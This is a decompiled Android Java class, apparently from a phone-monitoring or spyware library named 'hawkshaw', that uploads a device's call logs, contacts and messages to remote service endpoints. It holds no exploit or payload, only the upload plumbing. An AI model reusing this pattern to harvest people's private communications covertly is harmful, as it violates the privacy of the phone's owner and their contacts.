package com.hawkshaw.library.datalayer.network.service;

import X1.B;
import a3.e;
import com.hawkshaw.library.datalayer.models.PushCallLogsRequest;
import com.hawkshaw.library.datalayer.models.PushContactsRequest;
import com.hawkshaw.library.datalayer.models.PushMessagesRequest;
import t3.N;

public final class TelephonyServiceImpl implements TelephonyService {
    public Object pushCallLogs(PushCallLogsRequest pushCallLogsRequest, e eVar) {
        return B.B(N.f9292c, new TelephonyServiceImpl$pushCallLogs$$inlined$apiCall$default$1("calllog.CallLog/PushCallLogs", pushCallLogsRequest, false, (e) null), eVar);
    }

    public Object pushContacts(PushContactsRequest pushContactsRequest, e eVar) {
        return B.B(N.f9292c, new TelephonyServiceImpl$pushContacts$$inlined$apiCall$default$1("contacts.Contact/PushContacts", pushContactsRequest, false, (e) null), eVar);
    }

    public Object pushMessages(PushMessagesRequest pushMessagesRequest, e eVar) {
        return B.B(N.f9292c, new TelephonyServiceImpl$pushMessages$$inlined$apiCall$default$1("messages.Message/PushMessages", pushMessagesRequest, false, (e) null), eVar);
    }
}
